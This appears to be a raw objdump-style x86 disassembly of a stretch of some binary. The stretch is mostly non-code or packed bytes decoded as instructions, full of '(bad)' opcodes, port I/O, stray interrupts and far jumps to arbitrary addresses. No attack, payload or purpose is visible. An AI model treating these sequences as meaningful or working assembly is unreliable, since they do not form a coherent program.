  418d0f:	or     eax,DWORD PTR [ecx+eax*4-0x7ea24cdc]
  418d16:	mov    bh,0x33
  418d18:	out    0xb8,eax
  418d1a:	lds    edi,FWORD PTR [esi-0x76]
  418d1d:	retf   
  418d1e:	mov    ebp,0xc2452972
  418d23:	xor    al,0xfc
  418d25:	test   ebx,ebx
  418d27:	shr    BYTE PTR [ebp-0x25],1
  418d2a:	mov    ss,WORD PTR [ebp+0x71]
  418d2d:	jnp    0x418d83
  418d2f:	push   cs
  418d30:	outs   dx,BYTE PTR ds:[esi]
  418d31:	xlat   BYTE PTR ds:[ebx]
  418d32:	inc    ebx
  418d33:	jg     0x418d2a
  418d35:	stos   BYTE PTR es:[edi],al
  418d36:	rcl    DWORD PTR es:[edi-0x62b46fc1],1
  418d3d:	je     0x418cdd
  418d3f:	iret   
  418d40:	xchg   ebx,eax
  418d41:	pop    edx
  418d42:	add    ecx,DWORD PTR [esp+edi*8+0x43]
  418d46:	cs mov cl,0x3d
  418d49:	ror    BYTE PTR [eax],cl
  418d4b:	inc    ecx
  418d4c:	in     eax,dx
  418d4d:	pop    esp
  418d4e:	and    edi,DWORD PTR [ebx+0x34b70d8c]
  418d54:	push   ebx
  418d55:	out    dx,al
  418d56:	lods   eax,DWORD PTR ds:[esi]
  418d57:	mov    ah,0x36
  418d59:	jnp    0x418d7f
  418d5b:	icebp  
  418d5c:	test   eax,0x9fc352be
  418d61:	sbb    BYTE PTR [ecx+edi*2],al
  418d64:	pop    esi
  418d65:	test   al,0x91
  418d67:	cwde   
  418d68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d69:	stc    
  418d6a:	dec    esp
  418d6b:	pop    edx
  418d6c:	mov    edi,DWORD PTR [ebx]
  418d6e:	dec    edi
  418d6f:	add    BYTE PTR [ebx+0xa],al
  418d72:	pop    es
  418d73:	sbb    ah,BYTE PTR ds:0x74c2be3d
  418d79:	push   eax
  418d7a:	xchg   BYTE PTR [edi+eax*4+0x60fe848],dh
  418d81:	fnsave [ecx]
  418d83:	mov    WORD PTR ds:0xc0cf3cf7,ds
  418d89:	(bad)  
  418d8a:	jmp    0x854c9934
  418d8f:	jnp    0x418d47
  418d91:	add    ebp,DWORD PTR [ebx]
  418d93:	dec    edi
  418d94:	fbld   TBYTE PTR [edx-0x11]
  418d97:	(bad)  
  418d98:	xlat   BYTE PTR ds:[ebx]
  418d99:	stos   BYTE PTR es:[edi],al
  418d9a:	mov    bl,0x55
  418d9c:	ins    BYTE PTR es:[edi],dx
  418d9d:	addr16 jae 0x418dac
  418da0:	lea    edi,ds:0x4498b7f8
  418da6:	add    eax,0x2607cdaa
  418dab:	cmp    eax,0xbbdfd2c1
  418db0:	rol    DWORD PTR [edi-0x4a],1
  418db3:	or     esp,edx
  418db5:	ins    DWORD PTR es:[edi],dx
  418db6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418db7:	dec    esi
  418db8:	sbb    edi,DWORD PTR [ebp-0x48155005]
  418dbe:	or     al,0x5f
  418dc0:	arpl   dx,ax
  418dc2:	push   ebp
  418dc3:	aad    0xf
  418dc5:	jbe    0x418d87
  418dc7:	stos   BYTE PTR es:[edi],al
  418dc8:	imul   edx,DWORD PTR [eax+0x35d73baf],0x2e5c8481
  418dd2:	adc    BYTE PTR [edi],0xad
  418dd5:	add    DWORD PTR [edi-0xe],0x881c93cd
  418ddc:	bound  ebx,QWORD PTR [edi]
  418dde:	mov    bh,0x9
  418de0:	dec    esi
  418de1:	pop    ebp
  418de2:	daa    
  418de3:	mov    al,0x83
  418de5:	rcr    BYTE PTR [esi+0x4],cl
  418de8:	fcomp  DWORD PTR [ebp+0xa23fde1]
  418dee:	pop    esi
  418def:	cmp    ecx,ecx
  418df1:	push   0x9800bdba
  418df6:	pop    ecx
  418df7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418df8:	mov    ch,BYTE PTR [ebp+0x35eb7ab1]
  418dfe:	or     BYTE PTR [ebx-0x11],bh
  418e01:	pop    es
  418e02:	(bad)  
  418e03:	xchg   esp,eax
  418e04:	mov    ebp,0xa5c2d972
  418e09:	les    ecx,FWORD PTR [edi+0x72]
  418e0c:	adc    dh,BYTE PTR [eax-0xc3001ee]
  418e12:	nop
  418e13:	or     edi,DWORD PTR [esi-0x4de4b502]
  418e19:	shr    DWORD PTR [edx+0x77],0xa
  418e1d:	(bad)  
  418e1e:	out    0x26,eax
  418e20:	xchg   esp,eax
  418e21:	jnp    0x418e5e
  418e23:	inc    edi
  418e24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e25:	pop    es
  418e26:	test   al,0x3b
  418e28:	jle    0x418dc2
  418e2a:	nop
  418e2b:	jbe    0x418de9
  418e2d:	imul   esp,DWORD PTR [ebx+0x31b87904],0x32ce5dec
  418e37:	imul   eax,edi,0xffffffa8
  418e3a:	loopne 0x418e39
  418e3c:	nop
  418e3d:	cld    
  418e3e:	xchg   BYTE PTR [ebx-0x5],dl
  418e41:	jmp    0x418e1a
  418e43:	cmp    esp,DWORD PTR [edi]
  418e45:	sbb    eax,0x1a4d508a
  418e4a:	or     DWORD PTR [eax-0x146d9745],ebx
  418e50:	sbb    ebp,DWORD PTR [eax]
  418e52:	mov    al,0xf0
  418e54:	out    dx,eax
  418e55:	sub    esi,DWORD PTR [ebp-0x6e1cdc46]
  418e5b:	cmp    eax,0x19c45525
  418e60:	je     0x418ec4
  418e62:	pop    esp
  418e63:	mov    ecx,0xa9162ec8
  418e68:	mov    BYTE PTR [edi],0x51
  418e6b:	jo     0x418e98
  418e6d:	cld    
  418e6e:	stc    
  418e6f:	mov    bh,0xd5
  418e71:	and    al,0xe5
  418e73:	aad    0xb3
  418e75:	daa    
  418e76:	call   0x693d:0x264d4602
  418e7d:	jge    0x418edd
  418e7f:	mov    ds:0xe7b3d725,al
  418e84:	addr16 daa 
  418e86:	xchg   ebx,eax
  418e87:	push   ebx
  418e88:	adc    eax,0xe8f26c10
  418e8d:	sub    ch,cl
  418e8f:	pushf  
  418e90:	dec    ecx
  418e91:	repz adc esp,esi
  418e94:	loopne 0x418f14
  418e96:	lods   al,BYTE PTR ds:[esi]
  418e97:	inc    ecx
  418e98:	mov    dh,0x16
  418e9a:	xchg   esp,eax
  418e9b:	add    DWORD PTR [ecx-0x2fca63f0],ecx
  418ea1:	dec    esi
  418ea2:	sub    BYTE PTR [edi],dl
  418ea4:	mov    ebx,0x117c0042
  418ea9:	ja     0x418ec1
  418eab:	psrad  mm7,QWORD PTR [ecx]
  418eae:	push   edi
  418eaf:	xchg   ebp,ecx
  418eb1:	fmul   DWORD PTR ds:0x8b7177f0
  418eb7:	fisubr DWORD PTR [eax]
  418eb9:	in     eax,dx
  418eba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ebb:	ss loope 0x418f12
  418ebe:	push   0x67
  418ec0:	inc    edi
  418ec1:	jp     0x418eb5
  418ec3:	je     0x418efa
  418ec5:	dec    esp
  418ec6:	add    DWORD PTR [eax],esp
  418ec8:	add    bh,BYTE PTR [ebp-0x34]
  418ecb:	(bad)  
  418ecd:	sbb    dl,BYTE PTR [ecx]
  418ecf:	addr16 jle 0x418eb2
  418ed2:	(bad)
  418ed6:	or     al,0x75
  418ed8:	sub    eax,0xee62ec8
  418edd:	fwait
  418ede:	int3   
  418edf:	(bad)  
  418ee0:	in     al,dx
  418ee1:	call   0x9b8f:0x440cd7
  418ee8:	not    DWORD PTR [esi]
  418eea:	stc    
  418eeb:	call   0xbb0f:0xbc56bdae
  418ef2:	cmp    eax,0x926b5eef
  418ef7:	div    DWORD PTR [ebp+0x60]
  418efa:	les    esp,FWORD PTR [eax-0x6f139653]
  418f00:	cmp    BYTE PTR [ebx+0x61359ee1],bl
  418f06:	jo     0x418f26
  418f08:	out    0x73,eax
  418f0a:	loope  0x418f78
  418f0c:	in     eax,0xfe
  418f0e:	push   edi
  418f0f:	xor    BYTE PTR [ebx+ecx*8+0x0],cl
  418f13:	mov    eax,0xcb972a55
  418f18:	xchg   edi,eax
  418f19:	sub    ch,BYTE PTR [eax-0x7e]
  418f1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f1d:	dec    esi
  418f1e:	cs xchg esp,eax
  418f20:	dec    ecx
  418f21:	adc    eax,0xffffffe6
  418f24:	je     0x418f4e
  418f26:	jmp    0x418f66
  418f28:	stos   BYTE PTR es:[edi],al
  418f29:	lock jae 0x418f81
  418f2c:	sbb    eax,0x98749c67
  418f31:	sub    eax,0x8c9f8ad9
  418f36:	dec    DWORD PTR [edx+0x76]
  418f39:	jo     0x418f0b
  418f3b:	xor    al,0xf
  418f3d:	mov    edi,0x93f48082
  418f42:	xor    al,0xb
  418f44:	sbb    eax,0xc8628bc7
  418f49:	push   ebx
  418f4a:	jne    0x418fa7
  418f4c:	cli    
  418f4d:	(bad)  
  418f4e:	jmp    0xcca073e9
  418f53:	std    
  418f54:	sub    DWORD PTR [esi-0x1f644af6],ebp
  418f5a:	stos   BYTE PTR es:[edi],al
  418f5b:	mov    eax,ds:0xa6ff7ee4
  418f60:	rcr    ebp,cl
  418f62:	lods   eax,DWORD PTR ds:[esi]
  418f63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f64:	jmp    0x418eeb
  418f66:	lods   al,BYTE PTR ds:[esi]
  418f67:	mov    esp,0x9e1f8130
  418f6c:	xchg   esi,eax
  418f6d:	and    al,0x8a
  418f6f:	stos   BYTE PTR es:[edi],al
  418f70:	xchg   esp,eax
  418f71:	lods   al,BYTE PTR ds:[esi]
  418f72:	mov    eax,DWORD PTR ds:0xd16bb6d6
  418f78:	sub    eax,edi
  418f7a:	xchg   ecx,eax
  418f7b:	or     edx,DWORD PTR [ebp+0x38]
  418f7e:	pop    ebx
  418f7f:	xchg   esp,eax
  418f80:	pop    es
  418f81:	or     BYTE PTR [ebx-0x1c4d5c9e],0xe8
  418f88:	in     eax,0x73
  418f8a:	into   
  418f8b:	sub    eax,0xdfc90070
  418f90:	int3   
  418f91:	xor    DWORD PTR [esi-0x7e],0x5ff11e9b
  418f98:	and    bh,ch
  418f9a:	fld    TBYTE PTR [ecx]
  418f9c:	in     al,0x42
  418f9e:	jp     0x418fec
  418fa0:	xchg   DWORD PTR [ecx+0x58],eax
  418fa3:	xor    ebp,DWORD PTR [edx]
  418fa5:	(bad)  
  418fa6:	push   esp
  418fa7:	add    eax,0x9937a206
  418fac:	cmp    edi,DWORD PTR [ebx-0x6b]
  418faf:	fist   WORD PTR [esi+0x43]
  418fb2:	jge    0x419031
  418fb4:	sub    DWORD PTR [edx],0xffffffb0
  418fb7:	add    eax,0xad361ec9
  418fbc:	idiv   edi
  418fbe:	call   0xa5a2:0x53be7d12
  418fc5:	(bad)  
  418fc6:	jns    0x41902c
  418fc8:	in     al,0x73
  418fca:	or     DWORD PTR [edi+0x44],edi
  418fcd:	mov    edx,0xf74f8e4b
  418fd2:	xchg   ecx,eax
  418fd3:	sub    eax,0xd2b5c47
  418fd8:	imul   eax,DWORD PTR [eax],0x911ac291
  418fde:	add    ebx,DWORD PTR [esi+0x60]
  418fe1:	leave  
  418fe2:	fld    DWORD PTR [ebx-0x5d]
  418fe5:	and    al,0xfa
  418fe7:	dec    eax
  418fe8:	xchg   esp,eax
  418fe9:	pop    ds
  418fea:	fs dec ecx
  418fec:	sub    ecx,DWORD PTR [edi]
  418fee:	imul   ebx,DWORD PTR [eax],0xffffffac
  418ff1:	xor    eax,0xa4750c3
  418ff6:	popa   
  418ff7:	add    al,0x97
  418ff9:	inc    ecx
  418ffa:	lahf   
  418ffb:	test   BYTE PTR [esi+ecx*1],bl
  418ffe:	test   eax,0xeaed5ddd
  419003:	(bad)  
  419005:	dec    esi
  419006:	jmp    0xcfcd76b6
  41900b:	and    edi,DWORD PTR [ebp+0x707f8708]
  419011:	xchg   ecx,eax
  419012:	sub    ebx,DWORD PTR [edx-0x720ad645]
  419018:	push   cs
  419019:	and    BYTE PTR ds:0x9656109c,ch
  41901f:	mov    bh,0x5e
  419021:	lahf   
  419022:	fsub   st,st(0)
  419024:	arpl   WORD PTR [eax],cx
  419026:	sbb    BYTE PTR [ebp-0x2],bh
  419029:	hlt    
  41902a:	mov    bh,0x37
  41902c:	or     esi,DWORD PTR [eax+0x46]
  41902f:	icebp  
  419030:	or     esp,0xc160d642
  419036:	fisubr WORD PTR [edi]
  419038:	stos   BYTE PTR es:[edi],al
  419039:	mov    bl,0x45
  41903b:	scas   al,BYTE PTR es:[edi]
  41903c:	sbb    esi,edi
  41903e:	adc    al,BYTE PTR [ebp-0x3d]
  419041:	push   0x6a
  419043:	fst    DWORD PTR [ecx+0x5d]
  419046:	pusha  
  419047:	jmp    0x1dca:0xe5096af5
  41904e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41904f:	test   al,0xd8
  419051:	sahf   
  419052:	add    al,0xdd
  419054:	dec    esp
  419055:	cmp    eax,0x2393f6d6
  41905a:	ret    0xfc98
  41905d:	xchg   edi,eax
  41905e:	(bad)  [edi]
  419060:	gs pop ss
  419062:	xor    al,0x85
  419064:	mov    eax,edx
  419066:	pop    eax
  419067:	and    ah,cl
  419069:	or     DWORD PTR [ebp+0x710e5b69],ecx
  41906f:	(bad)  
  419070:	dec    edi
  419071:	sub    al,0x4b
  419073:	inc    eax
  419074:	mov    bh,0x80
  419076:	or     DWORD PTR [ecx],esi
  419078:	dec    esi
  419079:	pop    ebx
  41907a:	test   eax,0x4f4a25de
  41907f:	pop    eax
  419080:	int    0x40
  419082:	ss mov ecx,0x3705813d
  419088:	pop    edx
  419089:	jl     0x419092
  41908b:	cdq    
  41908c:	push   eax
  41908d:	sbb    dh,BYTE PTR [edi+eiz*1-0x65]
  419091:	xor    dh,dh
  419093:	popa   
  419094:	sbb    al,0x2b
  419096:	and    al,0x71
  419098:	aaa    
  419099:	push   edi
  41909a:	xor    esp,DWORD PTR [edx+0x42976c3e]
  4190a0:	push   ebx
  4190a1:	and    dh,BYTE PTR [edx]
  4190a3:	xchg   BYTE PTR [edx],dl
  4190a5:	ds retf 
  4190a7:	adc    al,0x87
  4190a9:	ins    DWORD PTR es:[edi],dx
  4190aa:	cmp    dh,al
  4190ac:	mov    al,ds:0xec2a2aef
  4190b1:	sbb    DWORD PTR [esi+0x6bd0d58c],esp
  4190b7:	cmp    DWORD PTR [eax-0xc],edi
  4190ba:	sbb    DWORD PTR [edi+0x68],ecx
  4190bd:	aam    0x7e
  4190bf:	std    
  4190c0:	lea    eax,[ebx+0x5c]
  4190c3:	xor    DWORD PTR [esi-0xe],0x48
  4190c7:	ror    DWORD PTR [ebp+0x289509b9],cl
  4190cd:	or     BYTE PTR [edi-0x68],ch
  4190d0:	add    DWORD PTR [ebp+0x6cdd0375],ebp
  4190d6:	cs inc eax
  4190d8:	int    0xe8
  4190da:	xchg   ebp,eax
  4190db:	or     al,dl
  4190dd:	lea    edi,[eax-0x76b5842b]
  4190e3:	test   al,0x91
  4190e5:	lock fsub DWORD PTR [ebp+0x23]
  4190e9:	cwde   
  4190ea:	ds xchg edx,eax
  4190ec:	adc    ecx,DWORD PTR [esi-0x3b]
  4190ef:	mul    DWORD PTR [esi-0x22]
  4190f2:	mov    al,ds:0x8902041b
  4190f7:	sar    ch,1
  4190f9:	mov    esi,edx
  4190fb:	rcl    BYTE PTR [ecx-0x74],1
  4190fe:	xchg   BYTE PTR [esp+ebx*8],ch
  419101:	loope  0x419106
  419103:	pusha  
  419104:	mov    ah,0x25
  419106:	(bad)  
  419107:	push   cs
  419108:	mov    ds:0x5b389a48,al
  41910d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41910e:	mov    al,ds:0x37a9f40d
  419113:	out    dx,al
  419114:	inc    eax
  419115:	mov    ?,WORD PTR [ecx]
  419117:	es popa 
  419119:	cmp    BYTE PTR [esi],al
  41911b:	cmp    BYTE PTR [ebx],al
  41911d:	out    dx,al
  41911e:	leave  
  41911f:	fimul  DWORD PTR [edi-0x1ae20015]
  419125:	ss mov ch,0xfd
  419128:	in     eax,0x8
  41912a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41912b:	in     eax,dx
  41912c:	lods   al,BYTE PTR cs:[esi]
  41912e:	sbb    DWORD PTR [edi],ecx
  419130:	fnstsw WORD PTR [eax+0x34d552b5]
  419136:	cwde   
  419137:	and    BYTE PTR [esi+0xc615c87],ch
  41913d:	(bad)  
  41913e:	fild   QWORD PTR [ecx-0x26d1d80d]
  419144:	test   DWORD PTR [edi-0xf],0xd804952b
  41914b:	pop    ebx
  41914c:	clc    
  41914d:	iret   
  41914e:	sub    DWORD PTR [ebx],eax
  419150:	xchg   esp,eax
  419151:	inc    ebp
  419152:	pop    es
  419153:	inc    esp
  419154:	call   0x3eee:0x69fd1ca3
  41915b:	(bad)  
  41915c:	hlt    
  41915d:	mov    edx,0x7b279cee
  419162:	in     eax,dx
  419163:	mov    cs,esp
  419165:	sub    al,0xd0
  419167:	sbb    edx,DWORD PTR [edi-0x7eed7c61]
  41916d:	jns    0x5b153c8
  419173:	xor    dl,ah
  419175:	or     bh,BYTE PTR [ebp+0x45b1afa0]
  41917b:	mov    al,0xe0
  41917d:	enter  0x9679,0x8c
  419181:	sub    DWORD PTR [esi-0x4243d0c5],eax
  419187:	aam    0xb
  419189:	rcl    BYTE PTR [ebx-0x589650e1],cl
  41918f:	mov    es,WORD PTR [ebx-0x14]
  419192:	jmp    0x419204
  419194:	int    0x63
  419196:	fidiv  DWORD PTR [ecx-0x34c96f7c]
  41919c:	pop    eax
  41919d:	mov    esi,ds
  41919f:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4191a1:	sub    BYTE PTR [eax-0xf],dl
  4191a4:	stos   DWORD PTR es:[di],eax
  4191a6:	mov    edi,DWORD PTR [ecx-0x8d6cc87]
  4191ac:	out    0x7e,al
  4191ae:	adc    esp,DWORD PTR [ebx+0x1]
  4191b1:	push   0xe0db7297
  4191b6:	rol    DWORD PTR [edx],0x3a
  4191b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191ba:	cmp    dh,dh
  4191bc:	mov    cl,0xcc
  4191be:	cmp    al,0xdb
  4191c0:	(bad)  
  4191c1:	les    edx,FWORD PTR [ebx+esi*2-0x7e]
  4191c5:	cmc    
  4191c6:	fwait
  4191c7:	xchg   edi,eax
  4191c8:	repz imul esp,DWORD PTR [edi+eiz*2],0x997d2cb3
  4191d0:	adc    DWORD PTR [ebx],0xfb00e2cb
  4191d6:	pop    esp
  4191d7:	pop    ds
  4191d8:	out    0x2d,al
  4191da:	in     al,dx
  4191db:	or     eax,0x4ad06c74
  4191e0:	mov    ebx,0xaa864555
  4191e5:	and    DWORD PTR [edx+0x48],ebp
  4191e8:	pusha  
  4191e9:	inc    ebp
  4191ea:	iret   
  4191eb:	mov    esi,0xe44d520d
  4191f0:	jp     0x4191a8
  4191f2:	fstp   TBYTE PTR [ebx]
  4191f4:	ret    
  4191f5:	jge    0x4191a8
  4191f7:	pop    esp
  4191f8:	shr    bl,0x4a
  4191fb:	sbb    dh,BYTE PTR [edx-0x63]
  4191fe:	push   ds
  4191ff:	inc    ebx
  419200:	int    0xe3
  419202:	jmp    0x6f858ea
  419207:	push   ebp
  419208:	mov    ah,0x55
  41920a:	inc    ebp
  41920b:	js     0x419197
  41920d:	fbld   TBYTE PTR [eax+0x58]
  419210:	adc    DWORD PTR [ebx+0x63],0x13e89265
  419217:	jl     0x4191c8
  419219:	ja     0x41920d
  41921b:	(bad)  
  41921c:	mov    bl,0xcf
  41921e:	and    al,0x64
  419220:	pushf  
  419221:	fisttp DWORD PTR [ecx-0x2]
  419224:	js     0x4192a1
  419226:	ret    0xbf77
  419229:	ja     0x41928d
  41922b:	adc    eax,0x8ccf9a43
  419230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419231:	lock inc esp
  419233:	lods   al,BYTE PTR ds:[esi]
  419234:	sbb    ebx,DWORD PTR [ebx]
  419236:	mov    ecx,0x61c6cd3d
  41923b:	dec    ax
  41923d:	nop
  41923e:	pop    ebp
  41923f:	test   al,0xf6
  419241:	arpl   WORD PTR [esi-0x47],cx
  419244:	shl    DWORD PTR [esi+0x46],cl
  419247:	call   0xe6c50b5a
  41924c:	cdq    
  41924d:	out    0x8,al
  41924f:	stos   DWORD PTR es:[edi],eax
  419250:	fcomp  st(1)
  419252:	push   0x1940903e
  419257:	push   esp
  419258:	xor    cl,BYTE PTR [edx-0x24911f06]
  41925e:	jg     0x419218
  419260:	addr16 cdq 
  419262:	cmp    dh,BYTE PTR [ebx+0x5d1a9dc9]
  419268:	push   0xfffffffc
  41926a:	jecxz  0x419219
  41926c:	out    dx,eax
  41926d:	xchg   ecx,eax
  41926e:	lahf   
  41926f:	in     eax,dx
  419270:	stos   DWORD PTR es:[edi],eax
  419271:	pushf  
  419272:	xchg   edx,eax
  419273:	fcomp  DWORD PTR [ebp+0x71ad1c41]
  419279:	ds pop edi
  41927b:	enter  0x63bd,0x9
  41927f:	pop    ss
  419280:	(bad)  
  419282:	add    esi,edi
  419284:	jg     0x419302
  419286:	scas   eax,DWORD PTR es:[edi]
  419287:	cmp    BYTE PTR [ecx+0x13947e7d],ah
  41928d:	jmp    0x4192f1
  41928f:	mov    ds:0xada54992,al
  419294:	mov    ds:0x6ce9ac5a,al
  419299:	imul   edi,eax,0xce7de6ba
  41929f:	adc    ebx,DWORD PTR [ebx]
  4192a1:	test   cl,ch
  4192a3:	popf   
  4192a4:	loop   0x4192e4
  4192a6:	adc    al,BYTE PTR [ebx+ecx*4+0x4]
  4192aa:	or     BYTE PTR [ecx+0x2],dh
  4192ad:	shl    DWORD PTR [ecx+0x1997aef9],cl
  4192b3:	mov    dl,0x20
  4192b5:	(bad)  
  4192b6:	xchg   ecx,eax
  4192b7:	and    esi,DWORD PTR [ecx]
  4192b9:	dec    ecx
  4192ba:	adc    BYTE PTR [esi],ah
  4192bc:	pop    edi
  4192bd:	je     0x4192c5
  4192bf:	retf   0x22d9
  4192c2:	sub    al,al
  4192c4:	out    0x83,al
  4192c6:	and    BYTE PTR [eax+0x41],bl
  4192c9:	hlt    
  4192ca:	(bad)  [ecx]
  4192cc:	scas   eax,DWORD PTR es:[edi]
  4192cd:	pop    ds
  4192ce:	ret    
  4192cf:	out    dx,eax
  4192d0:	mov    ecx,0x798613ed
  4192d5:	popa   
  4192d6:	jb     0x4192ac
  4192d8:	retf   0xa451
  4192db:	in     al,0x9f
  4192dd:	data16 jl 0x419296
  4192e0:	daa    
  4192e1:	sub    DWORD PTR [ebp+ecx*8-0x3c],edx
  4192e5:	mov    ebp,0x86a45fc
  4192ea:	xor    dl,dh
  4192ec:	mov    edx,0xdf7a7c0c
  4192f1:	(bad)  
  4192f2:	neg    BYTE PTR [edx]
  4192f4:	int    0xd
  4192f6:	dec    edi
  4192f7:	pop    es
  4192f8:	mov    cl,0xce
  4192fa:	inc    esi
  4192fb:	pop    ebp
  4192fc:	jb     0x4192a0
  4192fe:	xchg   edx,eax
  4192ff:	xor    ebx,DWORD PTR [ebx+0x57]
  419302:	xor    al,BYTE PTR [esi+0x70ccba31]
  419308:	mov    dh,0x47
  41930a:	in     al,0x96
  41930c:	shr    edx,cl
  41930e:	pop    ebp
  41930f:	add    ecx,DWORD PTR [eax+0x168c2f7]
  419315:	inc    esp
  419316:	xchg   ebx,eax
  419317:	pop    eax
  419318:	jg     0x419314
  41931a:	xchg   esi,eax
  41931b:	ds pushf 
  41931d:	push   esp
  41931e:	pop    ebp
  41931f:	cmc    
  419320:	or     edx,DWORD PTR [edx+0xb60e76c]
  419326:	js     0x419345
  419328:	or     al,0x62
  41932a:	mov    ds:0xcf68667,al
  41932f:	rol    eax,cl
  419331:	mov    cl,BYTE PTR [ecx]
  419333:	jne    0x4193b3
  419335:	pop    esp
  419336:	fwait
  419337:	or     al,0x93
  419339:	jmp    0x13db2f58
  41933e:	dec    ecx
  41933f:	pop    es
  419340:	xchg   DWORD PTR [edx+esi*1],edi
  419343:	jg     0x4192fd
  419345:	icebp  
  419346:	(bad)  
  419347:	ds jecxz 0x41932f
  41934a:	test   DWORD PTR [ecx],0x7ba5d457
  419350:	test   DWORD PTR [edx-0x6c],0x438968cd
  419357:	pop    ebp
  419358:	xchg   ecx,eax
  419359:	mov    edi,0xfee626e
  41935e:	push   ebp
  41935f:	jecxz  0x41938d
  419361:	fnstsw WORD PTR [ecx-0x19]
  419364:	dec    ebp
  419365:	jo     0x419359
  419367:	cdq    
  419368:	sub    edi,0xfeac06ec
  41936e:	sub    eax,0x6dd69bc4
  419373:	mov    ss,WORD PTR [esi-0x75]
  419376:	xor    eax,0x5a12ab5
  41937b:	push   0xb64f8451
  419380:	mov    ah,0xd4
  419382:	push   ds
  419383:	ret    
  419384:	inc    esi
  419385:	and    DWORD PTR [ebx-0x51c56d91],ebx
  41938b:	sbb    DWORD PTR [ebp+0x1b],edx
  41938e:	inc    edi
  41938f:	fucomi st,st(5)
  419391:	pop    ds
  419392:	mov    edx,0xf042be43
  419397:	sbb    al,0xa3
  419399:	sub    al,0x9c
  41939b:	pop    edi
  41939c:	lods   eax,DWORD PTR ds:[esi]
  41939d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41939e:	mov    al,0xdc
  4193a0:	push   ds
  4193a1:	push   esp
  4193a2:	adc    al,0x78
  4193a4:	or     DWORD PTR [edi-0x3851d187],0xf9538562
  4193ae:	xchg   edi,eax
  4193af:	inc    edx
  4193b0:	sbb    al,0xad
  4193b2:	xchg   ebp,eax
  4193b3:	mov    edi,0xd54781b1
  4193b8:	dec    ebx
  4193b9:	ret    
  4193ba:	or     ch,BYTE PTR [ebx+0x29]
  4193bd:	aam    0x31
  4193bf:	jge    0x419410
  4193c1:	test   DWORD PTR [esi-0x7185404c],edi
  4193c7:	addr16 cli 
  4193c9:	inc    eax
  4193ca:	pop    ds
  4193cb:	fstp   QWORD PTR [ecx-0xc]
  4193ce:	inc    eax
  4193cf:	and    eax,ebp
  4193d1:	sbb    eax,0xc9b9f118
  4193d6:	daa    
  4193d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193d8:	cmp    esi,DWORD PTR [ecx-0x7fb2201e]
  4193de:	jmp    0x419436
  4193e0:	mov    esi,0x5142c564
  4193e5:	repnz cmp edx,DWORD PTR [edx+0x367c41ba]
  4193ec:	mov    ebx,0x6749a020
  4193f1:	nop
  4193f2:	or     eax,0xbd06c203
  4193f7:	fs adc ebp,esi
  4193fa:	push   ss
  4193fb:	mov    gs,WORD PTR ss:[esp+ebp*8+0x64b0b0f8]
  419403:	xor    DWORD PTR [edi+0x7ed5543a],esp
  419409:	and    edx,0xffffffa1
  41940c:	and    dl,BYTE PTR ds:0xb3c14ae8
  419412:	sub    al,0xb9
  419414:	mov    esi,0xbfebff3b
  419419:	pop    ebx
  41941a:	outs   dx,DWORD PTR ds:[esi]
  41941b:	pop    ecx
  41941c:	or     al,0x38
  41941e:	pop    es
  41941f:	into   
  419420:	shr    bh,cl
  419422:	daa    
  419423:	out    dx,al
  419424:	(bad)  
  419425:	mov    dl,bh
  419427:	dec    esp
  419428:	dec    esp
  419429:	cmp    DWORD PTR [eax-0x7f],0xffffff81
  41942d:	syscall 
  41942f:	clc    
  419430:	(bad)  
  419431:	test   DWORD PTR [eax],esp
  419433:	jbe    0x419408
  419435:	repnz mov ah,0x17
  419438:	push   0xdf1d1d88
  41943d:	inc    esi
  41943e:	pop    eax
  41943f:	popa   
  419440:	xor    eax,0xf7567540
  419445:	jbe    0x4194b8
  419447:	xchg   esp,eax
  419448:	inc    esp
  419449:	call   0x600dd950
  41944e:	or     al,0x4c
  419450:	outs   dx,BYTE PTR ds:[esi]
  419451:	(bad)  
  419453:	ret    0x3d6f
  419456:	push   eax
  419457:	pop    ss
  419458:	fstp   TBYTE PTR [ecx]
  41945a:	or     DWORD PTR [esi+0x76e3caa0],esi
  419460:	or     ch,BYTE PTR [ecx]
  419462:	dec    ebp
  419463:	add    edi,esi
  419465:	jno    0x4194bb
  419467:	and    BYTE PTR [esi+0x6b2f6207],ch
  41946d:	shl    DWORD PTR [edi],0x3b
  419470:	mov    ebx,0x69615b46
  419475:	inc    edi
  419476:	pop    ebx
  419477:	sub    BYTE PTR [edx],ch
  419479:	cld    
  41947a:	daa    
  41947b:	mov    edi,0xda06e9e2
  419480:	and    eax,0xbdf3eb64
  419485:	inc    ecx
  419486:	rcl    DWORD PTR [edi+0x12],0x60
  41948a:	jl     0x41943d
  41948c:	jp     0x419418
  41948e:	retf   
  41948f:	cdq    
  419490:	sub    DWORD PTR [eax],ebx
  419492:	outs   dx,BYTE PTR ds:[esi]
  419493:	arpl   WORD PTR es:[ebp-0x740ccbc5],dx
  41949a:	test   BYTE PTR [ecx],0x94
  41949d:	push   ebp
  41949e:	hlt    
  41949f:	xor    eax,0x1719716f
  4194a5:	add    ecx,DWORD PTR [ecx-0x3aeab852]
  4194ab:	xchg   esi,eax
  4194ac:	scas   eax,DWORD PTR es:[edi]
  4194ad:	or     ch,al
  4194af:	add    ah,dh
  4194b1:	leave  
  4194b2:	xchg   esi,eax
  4194b3:	dec    edi
  4194b4:	add    BYTE PTR [ebp+esi*1-0x7],bh
  4194b8:	fild   QWORD PTR [edx+0x19]
  4194bb:	dec    esi
  4194bc:	iret   
  4194bd:	mov    al,0xe4
  4194bf:	xor    al,0x6c
  4194c1:	inc    ebx
  4194c2:	cmp    BYTE PTR [eax+0x11],0x15
  4194c6:	in     eax,dx
  4194c7:	(bad)  
  4194c8:	lds    ebx,FWORD PTR [eax+0x36624605]
  4194ce:	inc    esi
